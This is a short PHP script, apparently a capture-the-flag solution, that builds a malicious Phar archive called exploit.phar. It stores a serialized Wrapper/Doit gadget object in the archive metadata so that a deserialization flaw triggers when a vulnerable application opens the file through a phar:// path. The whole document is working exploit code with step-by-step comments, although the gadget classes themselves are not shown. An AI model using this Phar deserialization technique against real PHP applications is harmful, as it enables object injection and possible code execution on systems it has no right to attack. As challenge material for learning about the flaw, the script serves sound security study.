<?php

namespace Flag {
  include './Project/wrapper.php';

    use Doit;
    use Wrapper;

  $phar = new \Phar("exploit.phar");
  $phar->startBuffering();
  $phar->setStub("<?php __HALT_COMPILER();");

  # Setting the metadata serializes the payload object
  $payload = new Wrapper();
  $payload->doit = new Doit();
  # Here’s where the object is serialized and added to the Phar
  $phar->setMetadata($payload);

  # Add a dummy file to respect the Phar specifications
  $phar->addFromString("test.txt", "test");
  $phar->stopBuffering();
}